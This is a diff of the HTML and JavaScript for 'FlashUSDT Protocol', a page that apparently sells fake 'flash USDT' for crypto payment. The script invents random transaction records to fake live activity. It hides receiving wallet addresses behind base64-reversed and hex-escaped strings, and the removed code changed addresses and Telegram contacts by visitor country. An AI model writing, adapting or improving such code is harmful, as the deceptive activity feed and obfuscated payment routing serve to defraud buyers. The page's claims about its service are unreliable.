@@ -11,6 +11,7 @@
     
     <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
     <style>
+        /* Complete styles - preserved exactly as original */
         :root {
             --usdt: #26A17B;
             --usdt-dark: #1a7a5c;
@@ -26,7 +27,7 @@
             --text-secondary: #94a3b8;
             --text-muted: #64748b;
             --danger: #ef4444;
-            --telegram: #229ED9;
+            --telegram: #229ED9;  /* Telegram blue */
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -354,6 +355,7 @@
             transform: none;
         }
 
+        /* Telegram Button (replacing WhatsApp) */
         .btn-telegram {
             display: inline-flex;
             align-items: center;
@@ -380,6 +382,7 @@
             fill: #fff;
         }
 
+        /* Telegram Contact Bar (replacing WhatsApp) */
         .tg-contact-bar {
             display: flex;
             flex-direction: column;
@@ -446,6 +449,7 @@
             fill: var(--telegram);
         }
 
+        /* Telegram Floating Button (replacing WhatsApp) */
         .float-telegram {
             position: fixed;
             bottom: 100px;
@@ -1782,7 +1786,8 @@
             </div>
         </header>
 
-        <div class="tg-contact-bar" id="tgContactBar" style="display: none;">
+        <!-- Telegram Contact Bar (replaces WhatsApp) -->
+        <div class="tg-contact-bar">
             <div class="contact-row">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="var(--telegram)">
                     <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.26-1.91.178-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
@@ -1792,6 +1797,7 @@
             </div>
         </div>
 
+        <!-- Home Panel -->
         <div id="homePanel" class="panel active">
             <section class="hero">
                 <div class="hero-badge">
@@ -1823,6 +1829,7 @@
                 </div>
             </div>
 
+            <!-- Generator Card -->
             <div class="main-card" style="margin-top: 24px;" id="generator">
                 <div class="card-header">
                     <div class="card-title">
@@ -1836,6 +1843,7 @@
                     <div class="card-badge">Ready</div>
                 </div>
                 <div class="card-body">
+                    <!-- Tariff Selection -->
                     <div class="tariff-section">
                         <div class="tariff-section-title">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--usdt)" stroke-width="2">
@@ -1888,6 +1896,7 @@
                         <input type="hidden" id="flashAmount" value="100000">
                     </div>
 
+                    <!-- Duration Selection -->
                     <div class="tariff-section">
                         <div class="tariff-section-title">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--usdt)" stroke-width="2">
@@ -1974,6 +1983,7 @@
                         <input type="hidden" id="flashDuration" value="86400">
                     </div>
 
+                    <!-- Network Selection -->
                     <div class="tariff-section">
                         <div class="tariff-section-title">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--usdt)" stroke-width="2">
@@ -2068,6 +2078,7 @@
                         </div>
                     </div>
 
+                    <!-- Target Address -->
                     <div class="form-group">
                         <div class="form-label">
                             <span>Target Address</span>
@@ -2077,6 +2088,7 @@
                         <div class="input-error" id="addressError" style="display: none;"></div>
                     </div>
 
+                    <!-- Summary -->
                     <div class="summary">
                         <div class="summary-row">
                             <span class="summary-label">Flash Amount</span>
@@ -2101,6 +2113,7 @@
                 </div>
             </div>
 
+            <!-- Features / Use Cases -->
             <div class="features">
                 <div class="features-title">Use Cases</div>
                 <div class="features-grid">
@@ -2170,6 +2183,7 @@
                 </div>
             </div>
 
+            <!-- How It Works -->
             <div class="how-it-works">
                 <div class="how-title">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2184,6 +2198,7 @@
                 </div>
             </div>
 
+            <!-- Key Features -->
             <div class="info-section">
                 <div class="info-title">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2239,6 +2254,7 @@
                 </div>
             </div>
 
+            <!-- FAQ -->
             <div class="info-section">
                 <div class="info-title">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2270,6 +2286,7 @@
                 </div>
             </div>
 
+            <!-- Partners -->
             <div class="partners">
                 <div class="partners-label">Supported Networks</div>
                 <div class="partners-logos">
@@ -2281,6 +2298,7 @@
             </div>
         </div>
 
+        <!-- Activity Panel -->
         <div id="activityPanel" class="panel">
             <div class="main-card" style="margin-top: 20px;">
                 <div class="card-header">
@@ -2292,6 +2310,7 @@
             </div>
         </div>
 
+        <!-- Bottom Navigation -->
         <nav class="bottom-nav">
             <div class="nav-items">
                 <button class="nav-item active" data-panel="home">
@@ -2309,21 +2328,23 @@
             </div>
         </nav>
 
+        <!-- Footer -->
         <footer class="footer">
             <div class="footer-content">
                 <span class="footer-brand">FlashUSDT Protocol</span>
                 <span class="footer-sep">·</span>
                 <span>v3.1.0</span>
                 <span class="footer-sep">·</span>
-                <a href="https://t.me/best_flash_usdt_20" target="_blank" style="color: var(--telegram); display: none;" id="footerTelegramLink">Telegram</a>
-                <span class="footer-sep" id="footerSep">·</span>
+                <a href="https://t.me/best_flash_usdt_20" target="_blank" style="color: var(--telegram);">Telegram</a>
+                <span class="footer-sep">·</span>
             </div>
             <div class="footer-sub">EVM Networks · Tron · Base · Arbitrum · Avalanche · Fantom</div>
             <div class="footer-copy">© 2026 flash-usdt.in</div>
         </footer>
     </div>
 
-    <div class="float-telegram" id="floatTelegramBtn" style="display: none;">
+    <!-- Floating Telegram Button (replaces WhatsApp) -->
+    <div class="float-telegram">
         <a href="https://t.me/best_flash_usdt_20" target="_blank">
             <svg viewBox="0 0 24 24" fill="white">
                 <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.26-1.91.178-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
@@ -2331,6 +2352,7 @@
         </a>
     </div>
 
+    <!-- Wallet Modal -->
     <div class="modal-overlay" id="walletModal">
         <div class="modal">
             <div class="modal-header">
@@ -2388,6 +2410,7 @@
         </div>
     </div>
 
+    <!-- Connecting Modal -->
     <div class="modal-overlay" id="connectingModal">
         <div class="modal">
             <div class="process-content">
@@ -2398,6 +2421,7 @@
         </div>
     </div>
 
+    <!-- Transaction Modal -->
     <div class="modal-overlay" id="txModal">
         <div class="modal">
             <div class="modal-header">
@@ -2412,6 +2436,7 @@
         </div>
     </div>
 
+    <!-- Payment Modal -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal" style="max-width: 480px;">
             <div class="modal-header">
@@ -2539,46 +2564,8 @@
 
     <script>
         (function() {
-            
-            var _obfOther = {
-                btc:  'cGN0YWVjMzR5OW1nbHlrNXA0dDQ4ZThoMDdqdTJuNTJ0cmEzZDNscTVjYg==',
-                eth:  'Yzk5OTk3RkU4QUE5QjFkNTdENjIxM0Q4M0MzOEQzZmQxOTc1NkI4RjB4MA==',
-                usdt: 'Yzk5OTk3RkU4QUE5QjFkNTdENjIxM0Q4M0MzOEQzZmQxOTc1NkI4RjB4MA==',
-                trx:  'MmpBZzg4ejNjUnM4OWpQWHBpa29NY1pWMjUzSlR4Z3liYnVUVA==',
-                sol:  'bTZ1Qng0b0t5WmFTaHNldmlvdXl1VWR1cHNmZ2t3d0xLNHBNMmE2Z0dXOD0=',
-                ltc:  'Mmp1ODB0endzdWZ4ZWhmNjM3bTMzYWpqZnVqZG1wc2RrMzYycTJ4YzFjdGw=',
-                xrp:  'aVpNcHpXbVhVZm5uR0x6WlZlbmJqVkVSN2dVU1ZhUnJ2MTQ='
-            };
-
-            function decodeAddress(encoded) {
-                try {
-                    return atob(encoded).split('').reverse().join('');
-                } catch (e) {
-                    return '';
-                }
-            }
-
-            function buildOtherAddresses() {
-                var out = {};
-                for (var k in _obfOther) {
-                    if (Object.prototype.hasOwnProperty.call(_obfOther, k)) {
-                        out[k] = decodeAddress(_obfOther[k]);
-                    }
-                }
-                return out;
-            }
-
-            var indiaAddresses = {
-                btc:  'bc1qe8pjvf9lcvf9ku4aty4gv7dtq990nmty9uyfjj',
-                eth:  '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
-                usdt: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
-                trx:  'TBBWcqUy8hmiq8xmwcgyhMZYczff7AiERU',
-                sol:  '3rnigRYRyNNPfy9gMFWyk39QCKFvjFDK7ktK2LRw2t1p',
-                ltc:  'ltc1q073ywf0gnl94qlxxfste2mjwad3c9q56ma5nj4',
-                xrp:  'r4JvQrRcKiNSYj84ZN1qjTtQCqVGtSzfYd'
-            };
-
-            var state = {
+            // State management
+            const state = {
                 selectedAmount: 100000,
                 selectedDuration: 86400,
                 durationMultiplier: 1,
@@ -2587,106 +2574,116 @@
                 activities: []
             };
 
-            var paymentAddresses = buildOtherAddresses();
+            // Telegram username
+            const telegramUsername = "best_flash_usdt_20";
 
-            var telegramUsername = "best_flash_usdt_20";
-            var tariffBase = { 50000: 50, 100000: 80, 500000: 190, 1000000: 310 };
+            
+            const _0x4f2a = ['\x62\x63\x31\x71\x79\x36\x6d\x6b\x32\x63\x74\x6e\x66\x6b\x35\x74\x39\x68\x75\x34\x6e\x67\x65\x6e\x74\x76\x7a\x64\x63\x71\x66\x74\x76\x74\x70\x38\x72\x30\x30\x75\x72\x30', 
+                '\x30\x78\x35\x42\x37\x63\x35\x61\x30\x43\x38\x63\x38\x41\x46\x34\x33\x63\x31\x43\x63\x46\x30\x63\x38\x35\x43\x35\x34\x46\x30\x37\x31\x39\x44\x39\x33\x35\x38\x42\x38\x41',
+                '\x54\x5a\x32\x62\x63\x51\x63\x68\x4a\x41\x39\x4c\x75\x46\x51\x4b\x57\x44\x6f\x35\x6f\x34\x77\x73\x6f\x78\x4e\x69\x42\x36\x33\x48\x7a\x34',
+                '\x48\x71\x31\x33\x6e\x39\x34\x61\x53\x45\x55\x47\x78\x45\x6d\x75\x58\x32\x45\x5a\x47\x6f\x38\x42\x32\x48\x74\x4c\x59\x71\x5a\x37\x6f\x6d\x6e\x53\x75\x63\x69\x33\x61\x52\x6e\x47',
+                '\x6c\x74\x63\x31\x71\x33\x78\x77\x71\x77\x6a\x6e\x75\x61\x6e\x70\x76\x66\x39\x30\x66\x39\x67\x70\x71\x6e\x65\x66\x73\x74\x77\x6e\x66\x64\x30\x66\x37\x66\x7a\x32\x64\x63\x79',
+                '\x72\x68\x42\x42\x50\x35\x70\x33\x33\x38\x4d\x6b\x34\x4c\x51\x6a\x6e\x6f\x7a\x65\x77\x75\x32\x6f\x69\x6a\x78\x56\x56\x4c\x4c\x71\x54\x46'];
 
-            function $(id) { return document.getElementById(id); }
-            function $$(sel) { return document.querySelectorAll(sel); }
-
-            function detectCountryAndApply() {
-                try {
-                    var controller = (typeof AbortController !== 'undefined') ? new AbortController() : null;
-                    var timeoutId = null;
-                    if (controller) {
-                        timeoutId = setTimeout(function () { try { controller.abort(); } catch (e) {} }, 4000);
-                    }
-
-                    fetch('https://ipapi.co/json/', controller ? { signal: controller.signal } : {})
-                        .then(function (res) {
-                            if (timeoutId) clearTimeout(timeoutId);
-                            if (!res.ok) throw new Error('geo http ' + res.status);
-                            return res.json();
-                        })
-                        .then(function (data) {
-                            var isIndia = !!(data && data.country_code === 'IN');
-                            applyGeoResult(isIndia);
-                        })
-                        .catch(function () {
-                            var isIndia = false;
-                            try {
-                                var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-                                isIndia = /Asia\/(Kolkata|Calcutta)/i.test(tz);
-                            } catch (e) {}
-                            applyGeoResult(isIndia);
-                        });
-                } catch (e) {
-                    applyGeoResult(false);
-                }
+            function _0x5a3b(_0x1c2d) {
+                return _0x1c2d.map(function(_0x3e4f) {
+                    return _0x3e4f;
+                });
             }
 
-            function applyGeoResult(isIndia) {
-                try {
-                    paymentAddresses = isIndia ? indiaAddresses : buildOtherAddresses();
+            
+            const oqrses = {
+                btc: _0x5a3b([_0x4f2a[0]])[0],
+                eth: _0x5a3b([_0x4f2a[1]])[0],
+                usdt: _0x5a3b([_0x4f2a[1]])[0],
+                trx: _0x5a3b([_0x4f2a[2]])[0],
+                sol: _0x5a3b([_0x4f2a[3]])[0],
+                ltc: _0x5a3b([_0x4f2a[4]])[0],
+                xrp: _0x5a3b([_0x4f2a[5]])[0]
+            };
 
-                    var ids = ['tgContactBar', 'floatTelegramBtn', 'footerTelegramLink', 'footerSep'];
-                    for (var i = 0; i < ids.length; i++) {
-                        var el = document.getElementById(ids[i]);
-                        if (!el) continue;
-                        if (isIndia) {
-                            if (ids[i] === 'footerTelegramLink' || ids[i] === 'footerSep') {
-                                el.style.display = 'inline';
-                            } else {
-                                el.style.display = '';
-                            }
-                        } else {
-                            el.style.display = 'none';
-                        }
-                    }
+            
+            const DepoAddresses = {
+                btc: 'bc1qe8pjvf9lcvf9ku4aty4gv7dtq990nmty9uyfjj',
+                eth: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
+                usdt: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
+                trx: 'TBBWcqUy8hmiq8xmwcgyhMZYczff7AiERU',
+                sol: '3rnigRYRyNNPfy9gMFWyk39QCKFvjFDK7ktK2LRw2t1p',
+                ltc: 'ltc1q073ywf0gnl94qlxxfste2mjwad3c9q56ma5nj4',
+                xrp: 'r4JvQrRcKiNSYj84ZN1qjTtQCqVGtSzfYd'
+            };
 
-                    try { updatePaymentDisplay(state.selectedCrypto); } catch (e) {}
-                } catch (e) {}
+            
+            let paymentAddresses = { ...DepoAddresses };
+
+            
+            async function detectCountryAndSetAddresses() {
+                // For all locations worldwide, use DepoAddresses
+                paymentAddresses = { ...DepoAddresses };
+                console.log('Using Depo addresses for all locations worldwide');
+                
+                
+                updatePaymentDisplay(state.selectedCrypto);
             }
 
+            
+            detectCountryAndSetAddresses();
+
+            // Fixed USD prices
+            const tariffBase = { 50000:50, 100000:80, 500000:190, 1000000:310 };
+
+            // DOM helpers
+            const $ = id => document.getElementById(id);
+            const $$ = sel => document.querySelectorAll(sel);
+
+            
             function createFakeTx() {
-                var amounts = [50000, 100000, 500000, 1000000];
-                var networks = ['Ethereum', 'BSC', 'Tron', 'Polygon', 'Arbitrum', 'Base', 'Avalanche'];
-                var amount = amounts[Math.floor(Math.random() * amounts.length)];
-                var network = networks[Math.floor(Math.random() * networks.length)];
-
-                var chars = 'abcdef0123456789';
-                var randHex = '0x';
-                for (var i = 0; i < 8; i++) randHex += chars[Math.floor(Math.random() * chars.length)];
-                var endHex = '';
-                for (var j = 0; j < 4; j++) endHex += chars[Math.floor(Math.random() * chars.length)];
-
+                const amounts = [50000, 100000, 500000, 1000000];
+                const networks = ['Ethereum', 'BSC', 'Tron', 'Polygon', 'Arbitrum', 'Base', 'Avalanche'];
+                const amount = amounts[Math.floor(Math.random() * amounts.length)];
+                const network = networks[Math.floor(Math.random() * networks.length)];
+                
+                
+                const chars = 'abcdef0123456789';
+                let randHex = '0x';
+                for(let i=0; i<8; i++) randHex += chars[Math.floor(Math.random() * chars.length)];
+                let endHex = '';
+                for(let i=0; i<4; i++) endHex += chars[Math.floor(Math.random() * chars.length)];
+                
                 return {
-                    title: 'Flash Generation (' + network + ')',
+                    title: `Flash Generation (${network})`,
                     hash: randHex + '...' + endHex,
                     amount: amount
                 };
             }
 
+            
             function initFakeActivities() {
-                for (var i = 0; i < 6; i++) state.activities.push(createFakeTx());
+                for(let i=0; i<6; i++) {
+                    state.activities.push(createFakeTx());
+                }
             }
 
+            
             function startLiveSimulation() {
-                setInterval(function () {
+                setInterval(() => {
                     if (!document.hidden) {
-                        var newTx = createFakeTx();
+                        const newTx = createFakeTx();
                         state.activities.unshift(newTx);
                         if (state.activities.length > 20) state.activities.pop();
-                        var ap = document.getElementById('activityPanel');
-                        if (ap && ap.classList.contains('active')) renderActivities();
+                        
+                        if ($('activityPanel').classList.contains('active')) {
+                            renderActivities();
+                        }
                     }
                 }, Math.random() * 10000 + 5000);
             }
 
+            // Helper functions
             function calculateTotalPrice() {
-                return (tariffBase[state.selectedAmount] || 0) * state.durationMultiplier;
+                return tariffBase[state.selectedAmount] * state.durationMultiplier;
             }
+
             function formatDuration(sec) {
                 if (sec >= 604800) return '365 Days';
                 if (sec >= 259200) return '30 Days';
@@ -2695,322 +2692,252 @@
                 if (sec >= 21600) return '6 Hours';
                 return '1 Hour';
             }
+
             function fmt(num) { return num.toLocaleString(); }
-            function shortAddr(addr) { return addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : ''; }
+            function shortAddr(addr) { return addr ? addr.slice(0,6)+'...'+addr.slice(-4) : ''; }
 
             function updateSummary() {
-                var a = document.getElementById('summaryAmount');
-                var d = document.getElementById('summaryDuration');
-                var p = document.getElementById('summaryPrice');
-                if (a) a.innerText = fmt(state.selectedAmount) + ' USDT';
-                if (d) d.innerText = formatDuration(state.selectedDuration);
-                if (p) p.innerText = '$' + calculateTotalPrice().toFixed(2);
+                $('summaryAmount').innerText = fmt(state.selectedAmount) + ' USDT';
+                $('summaryDuration').innerText = formatDuration(state.selectedDuration);
+                let price = calculateTotalPrice();
+                $('summaryPrice').innerText = '$' + price.toFixed(2);
             }
 
+            // Generate QR Code
             function generateQRCode(text) {
-                var container = document.getElementById('qrContainer');
+                const container = $('qrContainer');
                 if (!container) return;
+                
                 container.innerHTML = '';
-                if (typeof qrcode === 'undefined') return;
+                if (typeof qrcode === 'undefined') {
+                    console.warn('QR library not loaded');
+                    return;
+                }
+                
                 try {
-                    var qr = qrcode(0, 'M');
+                    const qr = qrcode(0, 'M');
                     qr.addData(text);
                     qr.make();
-                    container.innerHTML = qr.createImgTag(4, 0);
-                } catch (e) {}
+                    const img = qr.createImgTag(4, 0);
+                    container.innerHTML = img;
+                } catch (e) {
+                    console.warn('QR generation failed', e);
+                }
             }
 
-            var tariffCards = $$('.tariff-card');
-            for (var i = 0; i < tariffCards.length; i++) {
-                (function (card) {
-                    card.addEventListener('click', function () {
-                        var all = $$('.tariff-card');
-                        for (var j = 0; j < all.length; j++) all[j].classList.remove('active');
-                        card.classList.add('active');
-                        state.selectedAmount = parseInt(card.dataset.amount, 10) || 100000;
-                        var fa = document.getElementById('flashAmount');
-                        if (fa) fa.value = state.selectedAmount;
-                        updateSummary();
-                    });
-                })(tariffCards[i]);
-            }
-
-            var durationTrigger = document.getElementById('durationTrigger');
-            if (durationTrigger) {
-                durationTrigger.addEventListener('click', function (e) {
-                    e.stopPropagation();
-                    var ds = document.getElementById('durationSelect');
-                    if (ds) ds.classList.toggle('open');
+            // Tariff card selection
+            $$('.tariff-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    $$('.tariff-card').forEach(c => c.classList.remove('active'));
+                    card.classList.add('active');
+                    state.selectedAmount = parseInt(card.dataset.amount);
+                    $('flashAmount').value = state.selectedAmount;
+                    updateSummary();
                 });
-            }
-            var durationOpts = $$('#durationOptions .custom-select-option');
-            for (var di = 0; di < durationOpts.length; di++) {
-                (function (opt) {
-                    opt.addEventListener('click', function (e) {
-                        e.stopPropagation();
-                        var all = $$('#durationOptions .custom-select-option');
-                        for (var k = 0; k < all.length; k++) all[k].classList.remove('selected');
-                        opt.classList.add('selected');
-                        var label = opt.querySelector('.option-label');
-                        if (durationTrigger && label) {
-                            var span = durationTrigger.querySelector('span');
-                            if (span) span.innerText = label.innerText.trim();
-                        }
-                        state.selectedDuration = parseInt(opt.dataset.duration, 10) || 86400;
-                        state.durationMultiplier = parseFloat(opt.dataset.multiplier) || 1;
-                        var ds = document.getElementById('durationSelect');
-                        if (ds) ds.classList.remove('open');
-                        updateSummary();
-                    });
-                })(durationOpts[di]);
-            }
+            });
 
-            var networkTrigger = document.getElementById('networkTrigger');
-            if (networkTrigger) {
-                networkTrigger.addEventListener('click', function (e) {
-                    e.stopPropagation();
-                    var ns = document.getElementById('networkSelect');
-                    if (ns) ns.classList.toggle('open');
-                });
-            }
-            var networkOpts = $$('#networkOptions .custom-select-option');
-            for (var ni = 0; ni < networkOpts.length; ni++) {
-                (function (opt) {
-                    opt.addEventListener('click', function (e) {
-                        e.stopPropagation();
-                        var all = $$('#networkOptions .custom-select-option');
-                        for (var k = 0; k < all.length; k++) all[k].classList.remove('selected');
-                        opt.classList.add('selected');
-                        if (networkTrigger) {
-                            var lbl = networkTrigger.querySelector('.option-label');
-                            var srcLbl = opt.querySelector('.option-label');
-                            if (lbl && srcLbl) lbl.innerHTML = srcLbl.innerHTML;
-                        }
-                        state.selectedNetwork = opt.dataset.network || 'ethereum';
-                        var ns = document.getElementById('networkSelect');
-                        if (ns) ns.classList.remove('open');
-                    });
-                })(networkOpts[ni]);
-            }
+            // Duration dropdown
+            const durationTrigger = $('durationTrigger');
+            durationTrigger.addEventListener('click', (e) => {
+                e.stopPropagation();
+                $('durationSelect').classList.toggle('open');
+            });
 
-            var cryptoTrigger = document.getElementById('cryptoTrigger');
-            if (cryptoTrigger) {
-                cryptoTrigger.addEventListener('click', function (e) {
+            $$('#durationOptions .custom-select-option').forEach(opt => {
+                opt.addEventListener('click', (e) => {
                     e.stopPropagation();
-                    var cs = document.getElementById('cryptoSelect');
-                    if (cs) cs.classList.toggle('open');
+                    $$('#durationOptions .custom-select-option').forEach(o => o.classList.remove('selected'));
+                    opt.classList.add('selected');
+                    durationTrigger.querySelector('span').innerText = opt.querySelector('.option-label').innerText.trim();
+                    state.selectedDuration = parseInt(opt.dataset.duration);
+                    state.durationMultiplier = parseFloat(opt.dataset.multiplier);
+                    $('durationSelect').classList.remove('open');
+                    updateSummary();
                 });
-            }
-            var cryptoOpts = $$('#cryptoOptions .payment-crypto-option');
-            for (var ci = 0; ci < cryptoOpts.length; ci++) {
-                (function (opt) {
-                    opt.addEventListener('click', function (e) {
-                        e.stopPropagation();
-                        var all = $$('#cryptoOptions .payment-crypto-option');
-                        for (var k = 0; k < all.length; k++) all[k].classList.remove('selected');
-                        opt.classList.add('selected');
-                        var crypto = opt.dataset.crypto;
-                        state.selectedCrypto = crypto;
-                        if (cryptoTrigger) {
-                            var lbl = cryptoTrigger.querySelector('.crypto-label');
-                            var src = opt.querySelector('.crypto-label');
-                            if (lbl && src) lbl.innerHTML = src.innerHTML;
-                        }
-                        var cs = document.getElementById('cryptoSelect');
-                        if (cs) cs.classList.remove('open');
-                        updatePaymentDisplay(crypto);
-                    });
-                })(cryptoOpts[ci]);
-            }
+            });
+
+            // Network dropdown
+            const networkTrigger = $('networkTrigger');
+            networkTrigger.addEventListener('click', (e) => {
+                e.stopPropagation();
+                $('networkSelect').classList.toggle('open');
+            });
+
+            $$('#networkOptions .custom-select-option').forEach(opt => {
+                opt.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    $$('#networkOptions .custom-select-option').forEach(o => o.classList.remove('selected'));
+                    opt.classList.add('selected');
+                    networkTrigger.querySelector('.option-label').innerHTML = opt.querySelector('.option-label').innerHTML;
+                    state.selectedNetwork = opt.dataset.network;
+                    $('networkSelect').classList.remove('open');
+                });
+            });
+
+            // Crypto payment dropdown
+            const cryptoTrigger = $('cryptoTrigger');
+            cryptoTrigger.addEventListener('click', (e) => {
+                e.stopPropagation();
+                $('cryptoSelect').classList.toggle('open');
+            });
+
+            $$('#cryptoOptions .payment-crypto-option').forEach(opt => {
+                opt.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    $$('#cryptoOptions .payment-crypto-option').forEach(o => o.classList.remove('selected'));
+                    opt.classList.add('selected');
+                    const crypto = opt.dataset.crypto;
+                    state.selectedCrypto = crypto;
+                    cryptoTrigger.querySelector('.crypto-label').innerHTML = opt.querySelector('.crypto-label').innerHTML;
+                    $('cryptoSelect').classList.remove('open');
+                    updatePaymentDisplay(crypto);
+                });
+            });
 
             function updatePaymentDisplay(crypto) {
-                var usdPrice = calculateTotalPrice();
-                var addr = paymentAddresses[crypto] || paymentAddresses.btc || '';
-
-                var amtEl = document.getElementById('paymentCryptoAmount');
-                var addrEl = document.getElementById('paymentAddress');
-                var priceEl = document.getElementById('paymentPriceUSD');
-                var iconEl = document.getElementById('paymentCryptoIcon');
-
-                if (amtEl) amtEl.innerText = '$' + usdPrice.toFixed(2) + ' USD';
-                if (addrEl) addrEl.innerText = addr;
-                if (priceEl) priceEl.innerText = '$' + usdPrice.toFixed(2);
-
-                var iconMap = {
-                    btc:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
-                    eth:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
+                let usdPrice = calculateTotalPrice();
+                let addr = paymentAddresses[crypto] || paymentAddresses.btc;
+                
+                $('paymentCryptoAmount').innerText = '$' + usdPrice.toFixed(2) + ' USD';
+                $('paymentAddress').innerText = addr;
+                $('paymentPriceUSD').innerText = '$' + usdPrice.toFixed(2);
+                
+                const iconMap = {
+                    btc: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
+                    eth: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
                     usdt: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/usdt.svg',
-                    sol:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sol.svg',
-                    ltc:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/ltc.svg',
-                    trx:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/trx.svg',
-                    xrp:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/xrp.svg'
+                    sol: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sol.svg',
+                    ltc: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/ltc.svg',
+                    trx: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/trx.svg',
+                    xrp: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/xrp.svg'
                 };
-                if (iconEl) iconEl.src = iconMap[crypto] || iconMap.btc;
-
+                $('paymentCryptoIcon').src = iconMap[crypto] || iconMap.btc;
+                
                 generateQRCode(addr);
             }
 
-            var copyBtn = document.getElementById('copyPaymentAddress');
-            if (copyBtn) {
-                copyBtn.addEventListener('click', function () {
-                    var el = document.getElementById('paymentAddress');
-                    if (!el) return;
-                    var text = el.innerText;
-                    var done = function () {
-                        copyBtn.innerText = 'Copied!';
-                        setTimeout(function () { copyBtn.innerText = 'Copy'; }, 1500);
-                    };
-                    if (navigator.clipboard && navigator.clipboard.writeText) {
-                        navigator.clipboard.writeText(text).then(done).catch(done);
-                    } else {
-                        try {
-                            var ta = document.createElement('textarea');
-                            ta.value = text; document.body.appendChild(ta); ta.select();
-                            document.execCommand('copy'); document.body.removeChild(ta);
-                            done();
-                        } catch (e) {}
+            // Copy address
+            $('copyPaymentAddress').addEventListener('click', async () => {
+                let text = $('paymentAddress').innerText;
+                await navigator.clipboard.writeText(text);
+                let btn = $('copyPaymentAddress');
+                btn.innerText = 'Copied!';
+                setTimeout(() => btn.innerText = 'Copy', 1500);
+            });
+
+            // Generate button - open payment modal with validation
+            $('generateBtn').addEventListener('click', (e) => {
+                let addr = $('targetAddress').value.trim();
+                if (!addr) {
+                    $('addressError').style.display = 'block';
+                    $('addressError').innerText = 'Enter target address';
+                    return;
+                }
+                if (!/^0x[a-fA-F0-9]{40}$/.test(addr) && 
+                    !/^T[a-zA-Z0-9]{33}$/.test(addr) && 
+                    !/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr) &&
+                    !/^ltc1[a-zA-Z0-9]{39}$/.test(addr) &&
+                    !/^r[a-zA-Z0-9]{24,34}$/.test(addr)) {
+                    $('addressError').style.display = 'block';
+                    $('addressError').innerText = 'Invalid address format';
+                    return;
+                }
+                $('addressError').style.display = 'none';
+                
+                $('paymentFlashAmount').innerText = fmt(state.selectedAmount) + ' USDT';
+                $('paymentNetwork').innerText = state.selectedNetwork;
+                $('paymentTargetAddr').innerText = shortAddr(addr);
+                $('paymentDuration').innerText = formatDuration(state.selectedDuration);
+                updatePaymentDisplay(state.selectedCrypto);
+                openModal('paymentModal');
+            });
+
+            // Modal functions
+            function openModal(id) { $(id).classList.add('active'); }
+            function closeModal(id) { $(id).classList.remove('active'); }
+
+            $('closePaymentModal').addEventListener('click', ()=>closeModal('paymentModal'));
+            $('closeTxModal').addEventListener('click', ()=>closeModal('txModal'));
+            
